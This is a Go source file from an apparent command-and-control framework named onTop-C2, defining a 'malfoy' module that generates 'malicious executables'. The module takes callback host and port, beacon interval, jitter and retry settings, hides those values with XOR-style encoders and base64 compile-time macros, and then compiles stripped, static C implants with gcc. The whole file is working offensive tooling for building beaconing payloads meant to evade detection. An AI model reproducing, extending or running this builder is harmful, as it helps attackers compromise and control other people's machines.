package chambers

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"

	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/spells"
	"github.com/Yyax13/onTop-C2/src/types"
)

var malfoyOptions map[string]*types.Rune = map[string]*types.Rune{
	"LPORT": {
		Name:        "LPORT",
		Description: "The LPORT to the custom spell",
		Required:    false,
		Value:       "65535",
	},
	"LHOST": {
		Name:        "LHOST",
		Description: "The HOST that target will connect",
		Required:    false,
		Value:       "0.0.0.0",
	},
	"PROTOCOL_NAME": {
		Name:        "PROTOCOL_NAME",
		Description: "The custom ritual (check avaliables using revelio rituals)",
		Required:    false,
		Value:       "tcp",
	},
	"SPELL": {
		Name:        "SPELL",
		Description: "The custom spell (check avaliables using revelio spell)",
		Required:    true,
		Value:       "",
	},
	"PROTOCOL_ENCODER_NAME": {
		Name:        "PROTOCOL_ENCODER_NAME",
		Description: "The fidelius name that will be used in ritual (check avaliables using revelio fidelius)",
		Required:    false,
		Value:       "basic/xor",
	},
	"PROTOCOL_ENCODER_KEY": {
		Name:        "PROTOCOL_ENCODER_KEY",
		Description: "The KEY for ritual's fidelius",
		Required:    false,
		Value:       "",
	},
	"PAYLOAD_ENCODER_NAME": {
		Name:        "PAYLOAD_ENCODER_NAME",
		Description: "The spell's fidelius",
		Required:    false,
		Value:       "basic/bjump",
	},
	"PAYLOAD_ENCODER_KEY": {
		Name:        "PAYLOAD_ENCODER_KEY",
		Description: "The spell's fidelius key",
		Required:    false,
		Value:       "",
	},
	"TIMEOUT": {
		Name:        "TIMEOUT",
		Description: "Timeout-able time in seconds",
		Required:    false,
		Value:       "10",
	},
	"SLEEP": {
		Name:        "SLEEP",
		Description: "Sleep time (in seconds) before request processing",
		Required:    false,
		Value:       "2",
	},
	"BEACON_TIME": {
		Name:        "BEACON_TIME",
		Description: "Sets the time (in seconds) between every beacon",
		Required:    false,
		Value:       "6",
	},
	"JITTER": {
		Name:        "JITTER",
		Description: "Adds jitter (percentage) between every beacon and sleep (beaconing time or sleep time ± jitter%)",
		Required:    false,
		Value:       "58",
	},
	"RETRY_METHOD": {
		Name:        "RETRY_METHOD",
		Description: "Sets connection retry method: 'none', 'fixed', 'linear', 'exponential', 'exponential_jitter'",
		Required:    false,
		Value:       "fixed",
	},
	"RETRY_DELAY": {
		Name:        "RETRY_DELAY",
		Description: "Base delay (in seconds) for the first retry attempt",
		Required:    false,
		Value:       "5",
	},
	"RETRY_ATTEMPTS_CAP": {
		Name:        "RETRY_ATTEMPTS_CAP",
		Description: "Maximum number of retry attempts (0 for infinite NOT RECOMMENDED)",
		Required:    false,
		Value:       "10",
	},
}

func malfoyExecute(runes map[string]*types.Rune) {
	spellName, ok := runes["SPELL"]
	if !ok {
		misc.PanicWarn("The SPELL rune was not set\n\n", false)
		return

	}

	spell, ok := spells.AvaliableSpells[spellName.Value]
	if !ok {
		misc.PanicWarn("The specified SPELL do not exists\n\n", false)
		return

	}

	spellPathInfo, err := os.Stat(spell.PayloadAsoluteDirPath)
	if os.IsNotExist(err) || !spellPathInfo.IsDir() {
		misc.PanicWarn("The specified SPELL is incomplete or bugged, contact hoWo the witch or use another spell\n\n", false)
		return

	}

	spellFideliusName, ok := runes["PAYLOAD_ENCODER_NAME"]
	if !ok {
		misc.PanicWarn("The SFIDELIUS rune was not set\n\n", false)
		return

	}

	spellFidelius, ok := fidelius.AvaliableFidelius[spellFideliusName.Value]
	if !ok {
		misc.PanicWarn("The specified SFIDELIUS do not exists\n\n", false)
		return

	}

	fideliusName, ok := runes["PROTOCOL_ENCODER_NAME"]
	if !ok {
		misc.PanicWarn("The FIDELIUS rune was not set\n\n", false)
		return

	}

	_, ok = fidelius.AvaliableFidelius[fideliusName.Value]
	if !ok {
		misc.PanicWarn("The specified FIDELIUS do not exists\n\n", false)
		return

	}

	misc.SysLog("Creating the temp directory", false)

	_, _filename, _, _ := runtime.Caller(0)
	_dirname := filepath.Dir(_filename)
	_tmpDir := path.Join(_dirname, "..", "..", "_tmp")
	os.Mkdir(_tmpDir, 0755)
	defer os.RemoveAll(_tmpDir)

	misc.SysLog(fmt.Sprintf("Created the temp directory at %s", _tmpDir), true)

	spellOutputName := fmt.Sprintf("mySpell%s", spell.OutFileExt)
	spellOutputFile := path.Join(_tmpDir, spellOutputName)

	gccOptimizeArgs := []string{"-Os", "-s", "-fdata-sections", "-ffunction-sections", "-W", "--data-sections", "-fstrict-aliasing", "-flto"}
	gccArgs := []string{path.Join(_tmpDir, "main.c")}
	gccArgs = append(gccArgs, []string{"-o", spellOutputName}...)
	gccArgs = append(gccArgs, gccOptimizeArgs...)
	gccArgs = append(gccArgs, []string{"-static", "-static-libgcc"}...)
	gccArgs = append(gccArgs, fmt.Sprintf("-L%s", _tmpDir))
	gccArgs = append(gccArgs, spell.GccLArgs...)

	for runeName, runeVal := range runes {
		if runeVal.Name == "PAYLOAD_ENCODER_NAME" || runeVal.Name == "PAYLOAD_ENCODER_KEY" {
			gccArgs = append(gccArgs, fmt.Sprintf("-D%s=\"%s\"", runeVal.Name, runeVal.Value))
			continue // Don't encode

		}

		if runeVal.Value != "" && runeName != "SPELL" {
			rawRuneValEncoded, _ := spellFidelius.Fidelius.Encode([]byte(runeVal.Value))
			runeValEncodedBase64 := base64.StdEncoding.EncodeToString(rawRuneValEncoded)
			gccArgs = append(gccArgs, fmt.Sprintf("-D%s=\"%s\"", runeVal.Name, runeValEncodedBase64))

		}

	}

	for _, macroVal := range spell.Macros {
		if macroVal.Macro != "" && macroVal.Value != "" {
			rawMacroValEncoded, _ := spellFidelius.Fidelius.Encode([]byte(macroVal.Value))
			macroValEncodedBase64 := base64.StdEncoding.EncodeToString(rawMacroValEncoded)
			gccArgs = append(gccArgs, fmt.Sprintf("-D%s=\"%s\"", macroVal.Macro, macroValEncodedBase64))

		}

	}

	misc.SysLog("Starting spell creating", true)
	misc.SysLog("Copying the spell base source to the temp directory", true)

	err = misc.CopyDir(spell.PayloadAsoluteDirPath, _tmpDir)
	if err != nil {
		misc.PanicWarn("Failed to copy the spell source, aborting...\n\n", true)
		return

	}

	misc.SysLog(fmt.Sprintf("Successfuly copied spell source from %s to %s", spell.PayloadAsoluteDirPath, _tmpDir), true)
	misc.SysLog("Starting spell's wrapper compile proccess", true)

	_goCompilerName := map[bool]string{true: "go.exe", false: "go"}[runtime.GOOS == "windows"]
	_goCompilerPath, err := exec.LookPath(_goCompilerName)
	if err != nil {
		misc.PanicWarn("Not found the 'go' compiler (go build), check if you have it installed and try again. Aborting...\n\n", true)
		return

	}

	_wrappersDirPath := path.Join(_dirname, "..", "wrappers")
	_wrappersCompilingArgs := []string{
		_goCompilerPath, "build",
		"-ldflags", "-s -w", 
		"-buildmode=c-archive",
		"-trimpath",

	}

	_wrapperCompileCmdArgs := append(_wrappersCompilingArgs, []string{"-o", path.Join(_tmpDir, "libwrapper.a"), path.Join(_wrappersDirPath, "wrapper.go")}...)

	_utilsWrapperCompileCmd := exec.Command(_goCompilerName, _wrapperCompileCmdArgs[1:]...)
	if err := _utilsWrapperCompileCmd.Run(); err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error occurred during wrapper compilation: %s\n\n", err), true)
		return

	} else {
		misc.SysLog("Successfuly compiled wrapper", true)

	}

	_compilerName := map[bool]string{true: "gcc.exe", false: "gcc"}[runtime.GOOS == "windows"]
	_compilerPath, err := exec.LookPath(_compilerName)
	if err != nil {
		misc.PanicWarn("Not found the 'gcc' compiler, check if you have it installed and try again. Aborting...\n\n", true)
		return

	}

	_gccCmd := exec.Command(_compilerPath, gccArgs...)
	_gccCmd.Dir = _tmpDir
	// _gccCmd.Stderr = os.Stdout;_gccCmd.Stdout = os.Stdout // debug
	if err := _gccCmd.Run(); err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error occurred during spell compilation: %s. Aborting...\n\n", err), true)
		// fmt.Println("\nFormated: \n\n", _gccCmd, fmt.Sprintf("\n\nRaw: %v\n", _gccCmd.Args)) // debug
		return

	}

	finalOutputFile := path.Join(_dirname, "..", "..", "build", spellOutputName)
	if err := misc.CopyFile(spellOutputFile, finalOutputFile); err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error occurred during spell copy to output dir %s: %s. Aborting...\n\n", finalOutputFile, err), true)
		return

	}

	os.Chmod(finalOutputFile, 0755)
	misc.SysLog(fmt.Sprintf("Successfuly compiled the spell %s, check it and happy hacking!\n", finalOutputFile), true)
	
}

var malfoy types.Chamber = types.Chamber{
	Name:        "malfoy",
	Description: "Creates custom spells (malicious executables)",
	Runes:       malfoyOptions,
	Parallel:    false,
	Execute:     malfoyExecute,
}

func init() {
	RegisterNewModule(&malfoy)

}
